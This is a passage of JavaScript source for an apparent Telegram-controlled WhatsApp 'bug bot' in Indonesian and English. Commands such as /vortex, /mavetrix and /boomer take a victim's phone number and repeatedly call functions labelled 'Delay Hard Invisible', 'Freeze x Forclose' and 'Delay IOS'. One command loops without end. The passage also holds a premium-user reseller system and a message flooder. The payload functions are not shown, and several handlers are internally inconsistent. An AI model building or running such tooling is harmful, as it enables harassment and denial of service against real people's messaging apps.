`\`\`\`js
⬡═―—⊱ ⎧ Mavetrix ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Delay Can Spam
⌑ Status: Sending…
\`\`\``,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "⌜📱⌟ Target", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );

  while (true) {
  await BebasSpam(sock, target)
    await sleep(1000);
  }

  await ctx.telegram.editMessageText(
    ctx.chat.id,
    processMessage.message_id,
    undefined,
`\`\`\`js
⬡═―—⊱ ⎧ Mavetrix ⎭ ⊰―—═⬡
⌑ Target   : ${q}
⌑ Result   : Delivered
⌑ Effect   : Delay Chat
⌑ Status   : Executed Successfully
\`\`\``,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "⌜📱⌟ ☇ Target", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );
});

bot.onText("vortex", async (msg, match) => {
  const q = ctx.message?.text?.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /vortex 62×××`);

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  const processMessage = await ctx.reply(
`\`\`\`js
⬡═―—⊱ ⎧ Mavetrix ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Delay Hard Invisible
⌑ Status: Sending…
\`\`\``,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "⌜📱⌟ Target", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );

  for (let i = 0; i < 10; i++) {
  await delayhard(sock, target, rtr = true)
    await sleep(1000);
  }

  await ctx.telegram.editMessageText(
    ctx.chat.id,
    processMessage.message_id,
    undefined,
`\`\`\`js
⬡═―—⊱ ⎧ Mavetrix ⎭ ⊰―—═⬡
⌑ Target   : ${q}
⌑ Result   : Delivered
⌑ Effect   : Delay Hard
⌑ Status   : Executed Successfully
\`\`\``,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "⌜📱⌟ ☇ Target", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );
});

bot.onText("mavetrix", async (msg, match) => {
  const q = ctx.message?.text?.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /mavetrix 62×××`);

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  const processMessage = await ctx.reply(
`\`\`\`js
⬡═―—⊱ ⎧ Mavetrix ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Freeze x Forclose
⌑ Status: Sending…
\`\`\``,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "⌜📱⌟ Target", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );

  for (let i = 0; i < 20; i++) {
  await DelayXFreeze(target)
    await sleep(1000);
  }

  await ctx.telegram.editMessageText(
    ctx.chat.id,
    processMessage.message_id,
    undefined,
`\`\`\`js
⬡═―—⊱ ⎧ Mavetrix ⎭ ⊰―—═⬡
⌑ Target   : ${q}
⌑ Result   : Delivered
⌑ Effect   :
• Force Close
• Freeze
⌑ Status   : Executed Successfully
\`\`\``,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "⌜📱⌟ ☇ Target", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );
});

bot.onText("boomer", async (msg, match) => {
  const q = ctx.message?.text?.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /boomer 62×××`);

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  const processMessage = await ctx.reply(
`\`\`\`js
⬡═―—⊱ ⎧ Mavetrix ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Delay IOS
⌑ Status: Sending…
\`\`\``,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "⌜📱⌟ Target", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );

  for (let i = 0; i < 100; i++) {
  await bantendelayIOS(sock, target)
    await sleep(3000);
  }

  await ctx.telegram.editMessageText(
    ctx.chat.id,
    processMessage.message_id,
    undefined,
`\`\`\`js
⬡═―—⊱ ⎧ Mavetrix ⎭ ⊰―—═⬡
⌑ Target   : ${q}
⌑ Result   : Delivered
⌑ Effect   : Delay IOS
⌑ Status   : Executed Successfully
\`\`\``,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "⌜📱⌟ ☇ Target", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );
});

bot.onText(/^\/brat(?: (.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const argsRaw = match[1];
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to add premium users."
    );
  }
  
  if (!argsRaw) {
    return bot.sendMessage(chatId, 'Gunakan: /brat <teks> [--gif] [--delay=500]');
  }

  try {
    const args = argsRaw.split(' ');

    const textParts = [];
    let isAnimated = false;
    let delay = 500;

    for (let arg of args) {
      if (arg === '--gif') isAnimated = true;
      else if (arg.startsWith('--delay=')) {
        const val = parseInt(arg.split('=')[1]);
        if (!isNaN(val)) delay = val;
      } else {
        textParts.push(arg);
      }
    }

    const text = textParts.join(' ');
    if (!text) {
      return bot.sendMessage(chatId, 'Teks tidak boleh kosong!');
    }

    // Validasi delay
    if (isAnimated && (delay < 100 || delay > 1500)) {
      return bot.sendMessage(chatId, 'Delay harus antara 100–1500 ms.');
    }

    await bot.sendMessage(chatId, '🌿 Generating stiker brat...');

    const apiUrl = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isAnimated=${isAnimated}&delay=${delay}`;
    const response = await axios.get(apiUrl, {
      responseType: 'arraybuffer',
    });

    const buffer = Buffer.from(response.data);

    // Kirim sticker (bot API auto-detects WebP/GIF)
    await bot.sendSticker(chatId, buffer);
  } catch (error) {
    console.error('❌ Error brat:', error.message);
    bot.sendMessage(chatId, 'Gagal membuat stiker brat. Coba lagi nanti ya!');
  }
});
bot.onText(/\/tourl/i, async (msg) => {
    const chatId = msg.chat.id;
    
    
    if (!msg.reply_to_message || (!msg.reply_to_message.document && !msg.reply_to_message.photo && !msg.reply_to_message.video)) {
        return bot.sendMessage(chatId, "❌ Silakan reply sebuah file/foto/video dengan command /tourl");
    }

    const repliedMsg = msg.reply_to_message;
    let fileId, fileName;

    
    if (repliedMsg.document) {
        fileId = repliedMsg.document.file_id;
        fileName = repliedMsg.document.file_name || `file_${Date.now()}`;
    } else if (repliedMsg.photo) {
        fileId = repliedMsg.photo[repliedMsg.photo.length - 1].file_id;
        fileName = `photo_${Date.now()}.jpg`;
    } else if (repliedMsg.video) {
        fileId = repliedMsg.video.file_id;
        fileName = `video_${Date.now()}.mp4`;
    }

    try {
        
        const processingMsg = await bot.sendMessage(chatId, "⏳ Mengupload ke Catbox...");

        
        const fileLink = await bot.getFileLink(fileId);
        const response = await axios.get(fileLink, { responseType: 'stream' });

        
        const form = new FormData();
        form.append('reqtype', 'fileupload');
        form.append('fileToUpload', response.data, {
            filename: fileName,
            contentType: response.headers['content-type']
        });

        const { data: catboxUrl } = await axios.post('https://catbox.moe/user/api.php', form, {
            headers: form.getHeaders()
        });

        
        await bot.editMessageText(` Upload berhasil!\n📎 URL: ${catboxUrl}`, {
            chat_id: chatId,
            message_id: processingMsg.message_id
        });

    } catch (error) {
        console.error(error);
        bot.sendMessage(chatId, "❌ Gagal mengupload file ke Catbox");
    }
});

bot.onText(/^\/clearbug\s+(.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const q = match[1]; // Ambil argumen setelah /delete-bug
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to view the premium list."
    );
  }

    if (!q) {
        return bot.sendMessage(chatId, `Cara Pakai Nih Njing!!!\n/clearbug 62xxx`);
    }
    
    let pepec = q.replace(/[^0-9]/g, "");
    if (pepec.startsWith('0')) {
        return bot.sendMessage(chatId, `Contoh : /clearbug 62xxx`);
    }
    
    let target = pepec + '@s.whatsapp.net';
    
    try {
        for (let i = 0; i < 3; i++) {
            await sock.sendMessage(target, { 
                text: "𝐌𝐀𝐕𝐄𝐓𝐑𝐈𝐗 𝐂𝐋𝐄𝐀𝐑 𝐁𝐔𝐆\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n𝐗𝐘𝐑𝐎𝐎𝐙𝐘𝐍𝐙𝐙 𝐆𝐀𝐍𝐓𝐄𝐍𝐆"
            });
        }
        bot.sendMessage(chatId, "Done Clear Bug By XyrooZynzz😜");
    } catch (err) {
        console.error("Error:", err);
        bot.sendMessage(chatId, "Ada kesalahan saat mengirim bug.");
    }
});

//=======case owner=======//
bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
      }
    );
  }

    // Cek apakah pengguna memiliki izin (hanya pemilik yang bisa menjalankan perintah ini)
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
            { parse_mode: "Markdown" }
        );
    }

    // Pengecekan input dari pengguna
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /deladmin 123456789.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /deladmin 6843967527.");
    }

    // Cari dan hapus user dari adminUsers
    const adminIndex = adminUsers.indexOf(userId);
    if (adminIndex !== -1) {
        adminUsers.splice(adminIndex, 1);
        saveAdminUsers();
        console.log(`${senderId} Removed ${userId} From Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been removed from admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is not an admin.`);
    }
});

bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
      }
    );
  }

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /addadmin 123456789.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /addadmin 6843967527.");
    }

    if (!adminUsers.includes(userId)) {
        adminUsers.push(userId);
        saveAdminUsers();
        console.log(`${senderId} Added ${userId} To Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been added as an admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is already an admin.`);
    }
});


bot.onText(/\/addowner (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
      }
    );
  }

  const newOwnerId = match[1].trim();

  try {
    const configPath = "./config.js";
    const configContent = fs.readFileSync(configPath, "utf8");

    if (config.OWNER_ID.includes(newOwnerId)) {
      return bot.sendMessage(
        chatId,
        `\`\`\`
╭─────────────────
│    GAGAL MENAMBAHKAN    
│────────────────
│ User ${newOwnerId} sudah
│ terdaftar sebagai owner
╰─────────────────\`\`\``,
        {
          parse_mode: "Markdown",
        }
      );
    }

    config.OWNER_ID.push(newOwnerId);

    const newContent = `module.exports = {
  BOT_TOKEN: "${config.BOT_TOKEN}",
  OWNER_ID: ${JSON.stringify(config.OWNER_ID)},
};`;

    fs.writeFileSync(configPath, newContent);

    await bot.sendMessage(
      chatId,
      `\`\`\`
╭─────────────────
│    BERHASIL MENAMBAHKAN    
│────────────────
│ ID: ${newOwnerId}
│ Status: Owner Bot
╰─────────────────\`\`\``,
      {
        parse_mode: "Markdown",
      }
    );
  } catch (error) {
    console.error("Error adding owner:", error);
    await bot.sendMessage(
      chatId,
      "❌ Terjadi kesalahan saat menambahkan owner. Silakan coba lagi.",
      {
        parse_mode: "Markdown",
      }
    );
  }
});

bot.onText(/\/delowner (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
      }
    );
  }

  const ownerIdToRemove = match[1].trim();

  try {
    const configPath = "./config.js";

    if (!config.OWNER_ID.includes(ownerIdToRemove)) {
      return bot.sendMessage(
        chatId,
        `\`\`\`
╭─────────────────
│    GAGAL MENGHAPUS    
│────────────────
│ User ${ownerIdToRemove} tidak
│ terdaftar sebagai owner
╰─────────────────\`\`\``,
        {
          parse_mode: "Markdown",
        }
      );
    }

    config.OWNER_ID = config.OWNER_ID.filter((id) => id !== ownerIdToRemove);

    const newContent = `module.exports = {
  BOT_TOKEN: "${config.BOT_TOKEN}",
  OWNER_ID: ${JSON.stringify(config.OWNER_ID)},
};`;

    fs.writeFileSync(configPath, newContent);

    await bot.sendMessage(
      chatId,
      `\`\`\`
╭─────────────────
│    BERHASIL MENGHAPUS    
│────────────────
│ ID: ${ownerIdToRemove}
│ Status: User Biasa
╰─────────────────\`\`\``,
      {
        parse_mode: "Markdown",
      }
    );
  } catch (error) {
    console.error("Error removing owner:", error);
    await bot.sendMessage(
      chatId,
      "❌ Terjadi kesalahan saat menghapus owner. Silakan coba lagi.",
      {
        parse_mode: "Markdown",
      }
    );
  }
});

bot.onText(/\/listbot/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to view the premium list."
    );
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender"
      );
    }

    let botList = 
  "```" + "\n" +
  "╭━━━⭓「 𝐋𝐢𝐒𝐓 ☇ °𝐁𝐎𝐓 」\n" +
  "║\n" +
  "┃\n";

let index = 1;

for (const [botNumber, sock] of sessions.entries()) {
  const status = sock.user ? "🟢" : "🔴";
  botList += `║ ◇ 𝐁𝐎𝐓 ${index} : ${botNumber}\n`;
  botList += `┃ ◇ 𝐒𝐓𝐀𝐓𝐔𝐒 : ${status}\n`;
  botList += "║\n";
  index++;
}
botList += `┃ ◇ 𝐓𝐎𝐓𝐀𝐋𝐒 : ${sessions.size}\n`;
botList += "╰━━━━━━━━━━━━━━━━━━⭓\n";
botList += "```";


    await bot.sendMessage(chatId, botList, { parse_mode: "Markdown" });
  } catch (error) {
    console.error("Error in listbot:", error);
    await bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat mengambil daftar bot. Silakan coba lagi."
    );
  }
});

bot.onText(/\/addsender (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
    } catch (error) {
    console.error(`Error connecting bot ${botNumber}:`, error); // <-- PERBAIKAN
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});

const moment = require("moment");

bot.onText(/\/setcd (\d+[smh])/, (msg, match) => {
  const chatId = msg.chat.id;
  const response = setCooldown(match[1]);

  bot.sendMessage(chatId, response);
});

bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to add premium users."
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      "❌ Missing input. Please provide a user ID and duration. Example: /addprem 6843967527 30d."
    );
  }

  const args = match[1].split(" ");
  if (args.length < 2) {
    return bot.sendMessage(
      chatId,
      "❌ Missing input. Please specify a duration. Example: /addprem 6843967527 30d."
    );
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ""));
  const duration = args[1];

  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid input. User ID must be a number. Example: /addprem 6843967527 30d."
    );
  }

  if (!/^\d+[dhm]$/.test(duration)) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid duration format. Use numbers followed by d (days), h (hours), or m (minutes). Example: 30d."
    );
  }

  const now = moment();
  const expirationDate = moment().add(
    parseInt(duration),
    duration.slice(-1) === "d"
      ? "days"
      : duration.slice(-1) === "h"
      ? "hours"
      : "minutes"
  );

  if (!premiumUsers.find((user) => user.id === userId)) {
    premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
    savePremiumUsers();
    console.log(
      `${senderId} added ${userId} to premium until ${expirationDate.format(
        "YYYY-MM-DD HH:mm:ss"
      )}`
    );
    bot.sendMessage(
      chatId,
      `✅ User ${userId} has been added to the premium list until ${expirationDate.format(
        "YYYY-MM-DD HH:mm:ss"
      )}.`
    );
  } else {
    const existingUser = premiumUsers.find((user) => user.id === userId);
    existingUser.expiresAt = expirationDate.toISOString(); // Extend expiration
    savePremiumUsers();
    bot.sendMessage(
      chatId,
      `✅ User ${userId} is already a premium user. Expiration extended until ${expirationDate.format(
        "YYYY-MM-DD HH:mm:ss"
      )}.`
    );
  }
});

bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna adalah owner atau admin
    if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ You are not authorized to remove premium users.");
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Please provide a user ID. Example: /delprem 6843967527");
    }

    const userId = parseInt(match[1]);

    if (isNaN(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number.");
    }

    // Cari index user dalam daftar premium
    const index = premiumUsers.findIndex(user => user.id === userId);
    if (index === -1) {
        return bot.sendMessage(chatId, `❌ User ${userId} is not in the premium list.`);
    }

    // Hapus user dari daftar
    premiumUsers.splice(index, 1);
    savePremiumUsers();
    bot.sendMessage(chatId, `✅ User ${userId} has been removed from the premium list.`);
});


bot.onText(/\/listprem/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to view the premium list."
    );
  }

  if (premiumUsers.length === 0) {
    return bot.sendMessage(chatId, "📌 No premium users found.");
  }

  let message = "```L I S T - P R E M \n\n```";
  premiumUsers.forEach((user, index) => {
    const expiresAt = moment(user.expiresAt).format("YYYY-MM-DD HH:mm:ss");
    message += `${index + 1}. ID: \`${
      user.id
    }\`\n   Expiration: ${expiresAt}\n\n`;
  });

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});

bot.onText(/\/cekidch (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const link = match[1];

  let result = await getWhatsAppChannelInfo(link);

  if (result.error) {
    bot.sendMessage(chatId, `⚠️ ${result.error}`);
  } else {
    let teks = `
📢 *Informasi Channel WhatsApp*
🔹 *ID:* ${result.id}
🔹 *Nama:* ${result.name}
🔹 *Total Pengikut:* ${result.subscribers}
🔹 *Status:* ${result.status}
🔹 *Verified:* ${result.verified}
        `;
    bot.sendMessage(chatId, teks);
  }
});

bot.onText(/\/delbot (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }

  const botNumber = match[1].replace(/[^0-9]/g, "");

  let statusMessage = await bot.sendMessage(
    chatId,
`
\`\`\`╭─────────────────
│    𝙼𝙴𝙽𝙶𝙷𝙰𝙿𝚄𝚂 𝙱𝙾𝚃    
│────────────────
│ Bot: ${botNumber}
│ Status: Memproses...
╰─────────────────\`\`\`
`,
    { parse_mode: "Markdown" }
  );

  try {
    const sock = sessions.get(botNumber);
    if (sock) {
      sock.logout();
      sessions.delete(botNumber);

      const sessionDir = path.join(SESSIONS_DIR, `device${botNumber}`);
      if (fs.existsSync(sessionDir)) {
        fs.rmSync(sessionDir, { recursive: true, force: true });
      }

      if (fs.existsSync(SESSIONS_FILE)) {
        const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
        const updatedNumbers = activeNumbers.filter((num) => num !== botNumber);
        fs.writeFileSync(SESSIONS_FILE, JSON.stringify(updatedNumbers));
      }

      await bot.editMessageText(`
\`\`\`
╭─────────────────
│    𝙱𝙾𝚃 𝙳𝙸𝙷𝙰𝙿𝚄𝚂   
│────────────────
│ Bot: ${botNumber}
│ Status: Berhasil dihapus!
╰─────────────────\`\`\`
`,
        {
          chat_id: chatId,
          message_id: statusMessage.message_id,
          parse_mode: "Markdown",
        }
      );
    } else {
      const sessionDir = path.join(SESSIONS_DIR, `device${botNumber}`);
      if (fs.existsSync(sessionDir)) {
        fs.rmSync(sessionDir, { recursive: true, force: true });

        if (fs.existsSync(SESSIONS_FILE)) {
          const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
          const updatedNumbers = activeNumbers.filter(
            (num) => num !== botNumber
          );
          fs.writeFileSync(SESSIONS_FILE, JSON.stringify(updatedNumbers));
        }

        await bot.editMessageText(`
\`\`\`
╭─────────────────
│    𝙱𝙾𝚃 𝙳𝙸𝙷𝙰𝙿𝚄𝚂   
│────────────────
│ Bot: ${botNumber}
│ Status: Berhasil dihapus!
╰─────────────────\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage.message_id,
            parse_mode: "Markdown",
          }
        );
      } else {
        await bot.editMessageText(`
\`\`\`
╭─────────────────
│    𝙴𝚁𝚁𝙾𝚁    
│────────────────
│ Bot: ${botNumber}
│ Status: Bot tidak ditemukan!
╰─────────────────\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage.message_id,
            parse_mode: "Markdown",
          }
        );
      }
    }
  } catch (error) {
    console.error("Error deleting bot:", error);
    await bot.editMessageText(`
\`\`\`
╭─────────────────
│    𝙴𝚁𝚁𝙾𝚁  
│────────────────
│ Bot: ${botNumber}
│ Status: ${error.message}
╰─────────────────\`\`\`
`,
      {
        chat_id: chatId,
        message_id: statusMessage.message_id,
        parse_mode: "Markdown",
      }
    );
  }
});

// Panggil fungsi startBot
startBot();

validateToken()